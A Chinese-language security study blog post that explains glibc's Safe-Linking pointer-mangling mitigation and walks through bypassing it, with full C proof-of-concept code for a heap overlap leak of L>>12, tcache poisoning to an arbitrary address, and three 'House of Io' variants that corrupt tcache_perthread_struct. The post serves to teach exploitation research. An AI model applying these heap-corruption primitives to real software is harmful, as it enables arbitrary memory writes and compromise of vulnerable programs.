---

layout: post

title: 'Safe-Linking机制分析'

date: '2020-06-04'

header-img: "img/home-bg.jpg"

tags:
     - 学习笔记  
author: 'De4dCr0w'

---

<!-- more -->

### 环境搭建

下载glibc引入Safe-Linking机制版本：

```
git clone git://sourceware.org/git/glibc.git
cd glibc
git checkout 76d5b2f002a1243ddba06bd646249553353f4322
```

编译：

```
sudo apt-get install gawk
cd glibc
mkdir build
cd build
../configure --prefix=/usr/local/glbic/glibc2.31
make
sudo make install
```

指定glibc编译poc代码：

```c
gcc poc.c -o poc -g -Wl,--rpath=/usr/local/glbic/glibc2.31/libc -Wl,--dynamic-linker=/usr/local/glbic/glibc2.31/lib/ld-linux-x86-64.so.2
```

安装pwngdb，之后就可以愉快地调试了。

### Safe-Linking 机制分析

打算从glibc 2.32引入Safe-Linking 保护，将堆块头部保存的地址重新计算，具体计算过程如下：

```c
#define PROTECT_PTR(pos, ptr, type)  \
        ((type)((((size_t)pos) >> PAGE_SHIFT) ^ ((size_t)ptr)))
#define REVEAL_PTR(pos, ptr, type)   \
        PROTECT_PTR(pos, ptr, type)
```

将指针的地址右移PAGE_SHIFT 再和指针本身异或，如下，L为指针的地址，P为指针本身，该操作是可逆的，取指针时再做一次操作就可以还原得到原来的指针：

![img](..\image\2020-06-04-Safe-Linking机制分析\4.png)

上述这种方法相当于对指针进行了随机化，有点像linux 内核下CONFIG_SLAB_FREELIST_HARDENED的缓解机制，CONFIG_SLAB_FREELIST_HARDENED的计算是：

```c
下一个free object的地址 = random ^ 当前free object的地址 ^ 当前free object 原本fd处的值
```

在 kmem_cache 增加了一个unsigned long类型的变量random。

### Safe-Linking 机制绕过

主要就是泄漏L>>12的值，通过构造堆块，使得chunkC被包含在一个大堆块中，有两个指针同时指向chunkC，造成UAF，释放一个chunkC指针到tcache中，此时chunkC为tcache中第一个bin，fd引入补丁前填充的是0，此时因为Safe-Linking，P' = L >> 12 ^ P = L >> 12 ^ 0 = L >> 12。所以fd填充的是L>>12的值，所以通过另一个chunkC指针就可以泄露该值，后续将目标地址和L12异或计算填充到fd，就可以达到任意地址的读写。

以下demo代码最终效果是将arbitrary_variable变量改写成0x112233445566。并且没有Safe-Linking的引入，demo代码也能达到相同效果，因为此时泄露出来的L>>12为0，目标地址和0异或还是正确的地址。

综上所述，要绕过Safe-Linking主要就是泄露L的信息。其实如果能泄露堆的地址也可以。

（1）首先将tcachebin_0xa0全部填满：

```c
 void *tcache_allocs[7];

    for( int i = 0; i < 7; i++) {
        tcache_allocs[i] = malloc(0x98);
    }

    char *chunkA = malloc(0x98);
    char *chunkB = malloc(0x98);
    char *chunkC = malloc(0x98);
    char *chunkD = malloc(0xb8);

    for( int i = 0; i < 7; i++) {
        SAFE_FREE(tcache_allocs[i]);
    }
```

![image-20200720153542534](..\image\2020-06-04-Safe-Linking机制分析\6.png)

（2）再释放chunkB后，chunkB就会进入unsorted bin中

```c
    SAFE_FREE(chunkB);
```

![image-20200720153913770](..\image\2020-06-04-Safe-Linking机制分析\7.png)

（3）覆盖chunkD的pre_size为0x140，size为0xa0，并填充 chunkD[0x98] = '\x21';

```c
  memcpy(chunkC, payload, 0x99);
  chunkD[0x98] = '\x21';
```

![image-20200720154334083](..\image\2020-06-04-Safe-Linking机制分析\8.png)

（4）伪造chunkB的size为0x141，再释放chunkD，就会将chunkD当成0xa0大小的堆块进行释放，并和之前chunkB进行合并，得到0x140+0xa0=0x1e0的unsorted bin，将chunkC包含其中：

```
    memcpy(chunkA, payload2, 0x9a);
    SAFE_FREE(chunkD);
```

![image-20200720154928923](..\image\2020-06-04-Safe-Linking机制分析\10.png)

（5）将0x1e0大小的chunkB分割成junk（就是最开始的chunkB）和chunkC2（即最开始的chunkC），此时chunkC和chunkC2同时指向同一个堆块，释放chunkC2后，进入tcachebin_0xa0，fd填充的是L>>12的值

```c
 for( int i = 0; i < 7; i++) {
        tcache_allocs[i] = malloc(0x98);
    }

    char *junk = malloc(0x98);
    char *chunkC2 = malloc(0x98);

    SAFE_FREE(chunkC2);
```

![image-20200720155712354](..\image\2020-06-04-Safe-Linking机制分析\11.png)

![image-20200720155751794](..\image\2020-06-04-Safe-Linking机制分析\12.png)

（6）泄露得到L>>12的值，伪造要分配的目标堆块地址，将arbitrary_variable变量包含在堆块中。重新申请chunkC3，此时chunkC和chunkC3指向同一个堆块

```c
uint64_t L12 = *(int64_t *)chunkC;
uint64_t masked_ptr = L12 ^ (((uint64_t) &arbitrary_variable) & ~0xf);
uint64_t *chunkC3 = malloc(0x98);
SAFE_FREE(tcache_allocs[0]);
SAFE_FREE(chunkC3);
```

（7）修改chunkC的fd为伪造的目标堆块地址，利用house of spirit ，分配到该堆块，就可以修改arbitrary_variable变量的值。

```c
*(uint64_t *) chunkC = masked_ptr;
char *junk2 = malloc(0x98);
uint64_t *winner = malloc(0x98);
*(winner+1) = 0x112233445566;
```

![image-20200720161540197](..\image\2020-06-04-Safe-Linking机制分析\13.png)

完整demo代码如下：

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <inttypes.h>

#define SAFE_FREE(p) { free(p); p = NULL; }

char *payload = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
                "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
                "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x40\x01\x00\x00\x00\x00"
                "\x00\x00\xa0";

char *payload2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
                 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
                 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x41\x01";

uint64_t screw_up_alignment = 0x4a4a4a4a;
uint64_t arbitrary_variable = 0x11111111;

int bypass_demo() {
    void *tcache_allocs[7];

    for( int i = 0; i < 7; i++) {
        tcache_allocs[i] = malloc(0x98);
    }

    char *chunkA = malloc(0x98);
    char *chunkB = malloc(0x98);
    char *chunkC = malloc(0x98);
    char *chunkD = malloc(0xb8);

    for( int i = 0; i < 7; i++) {
        SAFE_FREE(tcache_allocs[i]);
    }

    SAFE_FREE(chunkB);

    memcpy(chunkC, payload, 0x99);

    chunkD[0x98] = '\x21';

    memcpy(chunkA, payload2, 0x9a);

    SAFE_FREE(chunkD);

    for( int i = 0; i < 7; i++) {
        tcache_allocs[i] = malloc(0x98);
    }

    char *junk = malloc(0x98);
    char *chunkC2 = malloc(0x98);

    SAFE_FREE(chunkC2);

    uint64_t L12 = *(int64_t *)chunkC;

    uint64_t masked_ptr = L12 ^ (((uint64_t) &arbitrary_variable) & ~0xf);
    uint64_t *chunkC3 = malloc(0x98);

    SAFE_FREE(tcache_allocs[0]);

    SAFE_FREE(chunkC3);

    *(uint64_t *) chunkC = masked_ptr;
    
    char *junk2 = malloc(0x98);
    uint64_t *winner = malloc(0x98);

    *(winner+1) = 0x112233445566;

    printf("Arbitrary variable now contains 0x%lx\n", arbitrary_variable);
}

int main() {
    printf("Arbitrary variable now contains 0x%lx\n", arbitrary_variable);
    bypass_demo();
    return 0;
    
}
```



### 不用信息泄露绕过Safe-Linking 机制

每个线程通过一个tcache_perthread_struct线程本地变量保存tcache bin以及相关的chunk计数。tcache_perthread_struct的初始化过程如下，在分配堆块时，会先分配tcache_perthread_struct结构体，大小为0x290，在堆块的最开始位置。

```c
victim = _int_malloc (ar_ptr, bytes);

[…]

if (victim)
{
        tcache = (tcache_perthread_struct *) victim;
        memset (tcache, 0, sizeof (tcache_perthread_struct));
}
```

tcache_perthread_struct的结构如下：

```c
typedef struct tcache_perthread_struct
{
  char counts[TCACHE_MAX_BINS];
  tcache_entry *entries[TCACHE_MAX_BINS];
} tcache_perthread_struct;
```

count是一个字节数组（共64个字节，对应64个tcache链表），其中每一个字节表示的是tcache每一个链表中有多少个元素。entries是一个指针数组（共64个元素，对应64个tcache链表， tcache bin中最大为0x400字节），每一个指针指向的是对应tcache_entry结构体的地址。

如果我们能够修改tcache_perthread_struct这个结构体的内容，就可以完全控制malloc的内存分配。

（1）因为tcache_perthread_struct结构体，在堆块的最开始位置，可以通过计算偏移，通过当前堆块的地址减去偏移，得到tcache_perthread_struct的地址。

（2）在释放一个堆块后，会在堆块的bk位置填充tcache_perthread_struct的地址。

![image-20200720151139578](..\image\2020-06-04-Safe-Linking机制分析\5.png)

#### demo分析

[houseofio.c](https://github.com/Ruia-ruia/Exploits/blob/master/houseofio.c)

```c
/* House of Io for Malloc in Glibc 2.32 - safe-linking bypass
abstraction layer high enough to be be universal, though somewhat 
optimistic in terms of the availability of exploit primitives */

#include <stdio.h>
#include <stdlib.h>

unsigned long victim = 1;

int main()
{
        long int *a, *b, *c;

        a = malloc(20);
        b = malloc(20);
        free(b);// 释放b堆块后，b堆块的bk被覆盖为tcache_perthread_struct结构体的地址
        a = *(b + 1); // 泄露得到tcache_perthread_struct结构体的地址
        *a = 2; // 修改counts[0]为2
        long int *z = (char *)a + 0x80;// 偏移0x80的部分是entries指针数组位置

        *z = &victim; // 将entries[0]填充为victim变量的地址，此时会将victim变量的地址当成一个被释放的堆块，大小为0x20

        int *v = malloc(0x15);// 获得victim变量所在的堆块

        *v = 2; // 进行修改
        
        printf("%d\n", victim);
        return 0;
}
```

上述demo还是需要泄露得到tcache_perthread_struct结构体的地址，以下的demo不需要：

[houseofstructuredio.c](https://github.com/Ruia-ruia/Exploits/blob/master/houseofstructuredio.c)

```c
#include <stdio.h>
#include <stdlib.h>

unsigned long victim = 1;

typedef struct hi {
        char *a;
        char *b;
};

int main()
{
        long int *a, *b, *c;
        struct hi *ptr = malloc(sizeof(ptr));

        ptr->a = malloc(10);
        ptr->b = malloc(10);

        free(ptr);// 释放ptr堆块，在ptr->b被覆盖为tcache_perthread_struct结构体的地址
        free(ptr->b);// 释放tcache_perthread_struct结构
        
        a = malloc(0x285);// 重新申请得到tcache_perthread_struct结构
        *a = 2; //修改counts[0]为2

        long int *z = (char *)a + 0x80; // 下面操作同上
        *z = &victim; 
        int *v = malloc(0x15);
        *v = 2; 
        
        printf("%d\n", victim);

        return 0;
}
```

另一个类似的demo，只是不通过释放再重新申请得到tcache_perthread_struct结构体，而是直接修改tcache_perthread_struct结构体:

[houseofiostructuaf.c](https://github.com/Ruia-ruia/Exploits/blob/master/houseofiostructuaf.c)

```c
/* STRUCT UAF variant of House of Io */

#include <stdio.h>
#include <stdlib.h>

unsigned long victim = 1;

typedef struct hi {
        char *a;
        char *b;
};

int main()
{
        long int *a, *b, *z;
        struct hi *ptr = malloc(sizeof(ptr));

        ptr->a = malloc(10);
        ptr->b = malloc(10);
        free(ptr);

        a = ptr->b;        
        *a = 2;

        z = (char *)a + 0x80;
        *z = &victim;
        b = malloc(0x15);
        *b = 2; 
        
        printf("%d\n", victim);

        return 0;
}
```



### 参考链接

在uclibc-ng中引入的补丁：https://gogs.waldemar-brodkorb.de/oss/uclibc-ng/commit/886878b22424d6f95bcdeee55ada72049d21547c  就是在取p->fd和存放p->fd时都改成调用REVEAL_PTR

https://research.checkpoint.com/2020/safe-linking-eliminating-a-20-year-old-malloc-exploit-primitive/  机制介绍

https://www.researchinnovations.com/post/bypassing-the-upcoming-safe-linking-mitigation 机制绕过

 House of Io：https://awaraucom.wordpress.com/2020/07/13/house-of-io/

demo 地址： https://github.com/Ruia-ruia/Exploits

